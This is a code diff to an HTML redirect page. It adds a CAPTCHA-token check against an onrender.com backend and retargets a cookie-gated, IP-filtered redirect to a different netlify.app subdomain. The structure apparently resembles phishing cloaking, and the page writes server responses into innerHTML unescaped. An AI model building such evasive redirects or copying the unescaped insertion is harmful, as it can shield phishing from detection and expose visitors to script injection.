@@ -15,7 +15,46 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.2.6/gsap.min.js"></script>
 	<meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirect Example</title>
+    <title>Redirect</title>
+	<script>
+        // Function to get URL parameters
+        function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+
+        // Function to handle page load
+        window.onload = function() {
+            const token = getQueryParam('token');
+            
+            if (!token) {
+                // If no token is found, show a message and prevent further action
+                document.body.innerHTML = '<h1>Error: No CAPTCHA token received. Please complete the CAPTCHA.</h1>';
+                return; // Prevent further execution
+            } else {
+                // Proceed to verify the token
+                verifyToken(token);
+            }
+        };
+
+        // Function to send the token to your back end for verification
+        function verifyToken(token) {
+            fetch('https://captcha-70fu.onrender.com/verify-token?token=' + token)
+                .then(response => {
+                    if (response.ok) {
+                        return response.text(); // or response.json() based on your back end response
+                    }
+                    throw new Error('CAPTCHA verification failed');
+                })
+                .then(data => {
+                    document.body.innerHTML = `<h1>${data}</h1>`; // Display success message
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    document.body.innerHTML = '<h1>Error during verification. Please try again.</h1>';
+                });
+        }
+    </script>
     <script>
         const blacklistedIPs = ["192.168.73.109"]; 
 
@@ -38,7 +77,7 @@
                         document.cookie = "visited=true; path=/; max-age=" +30; // Expires in 5 minutes
 
                         // Redirect to the desired link
-                        window.location.href = "https://superlative-bubblegum-434a7b.netlify.app/"; 
+                        window.location.href = "https://friendly-granita-d24204.netlify.app/"; 
                     } else {
                         // User has visited before, show page content
                         document.getElementById("content").style.display = "block";
